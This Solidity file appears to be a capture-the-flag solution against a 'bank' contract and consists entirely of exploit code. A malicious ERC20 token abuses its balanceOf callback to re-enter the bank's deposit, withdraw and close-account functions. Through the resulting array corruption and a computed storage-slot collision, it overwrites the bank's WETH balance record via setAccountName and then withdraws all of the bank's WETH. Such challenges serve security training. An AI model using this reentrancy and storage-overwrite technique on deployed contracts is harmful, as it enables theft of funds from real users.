import "./Setup.sol";

contract BadToken is ERC20Like {
    mapping(address => uint) balances;

    uint stage = 0;

    function transfer(address dst, uint qty) public returns (bool) {
        balances[msg.sender] -= qty;
        balances[dst] += qty;
        return true;
    }

    function transferFrom(address src, address dst, uint qty) public returns (bool) {
        balances[src] -= qty;
        balances[dst] += qty;
        return true;
    }

    function approve(address, uint) public returns (bool) {
        return true;
    }

    function balanceOf(address who) public view returns (uint) {
        uint result = balances[who];

        if (reentrancyState == 1) {
            reentrancyState++;
            bank.withdrawToken(0, this, 0);
        } else if (reentrancyState == 2) {
            reentrancyState++;
            bank.depositToken(0, this, 0);
        } else if (reentrancyState == 3) {
            reentrancyState++;
            bank.closeLastAccount();
        }

        return result;
    }

    Bank private bank;
    WETH9 private weth;
    uint public reentrancyState;

    function exploit(bankSetup setup) public {
        bank = setup.bank();
        weth = setup.weth();

        reentrancyState = 1;
        bank.depositToken(0, address(this), 0);

        bytes32 myArraySlot = keccak256(bytes32(address(this)), uint(2));
        bytes32 myArrayStart = keccak256(myArraySlot);

        uint account = 0;
        uint slotsNeeded;
        while (true) {
            bytes32 account0Start = bytes32(uint(myArrayStart) + 3*account);
            bytes32 account0Balances = bytes32(uint(account0Start) + 2);
            bytes32 wethBalance = keccak256(bytes32(address(weth)), account0Balances);

            slotsNeeded = (uint(-1) - uint(myArrayStart));
            slotsNeeded++;
            slotsNeeded += uint(wethBalance);
            if (uint(slotsNeeded) % 3 == 0) {
                break;
            }
            account++;
        }

        uint accountId = uint(slotsNeeded) / 3;

        bank.setAccountName(accountId, string(abi.encodePacked(bytes31(uint248(uint(-1))))));

        bank.withdrawToken(account, address(weth), weth.balanceOf(address(bank)));
    }
}

contract bankExploit {
    constructor(bankSetup setup) public {
        new BadToken().exploit(setup);
    }
}
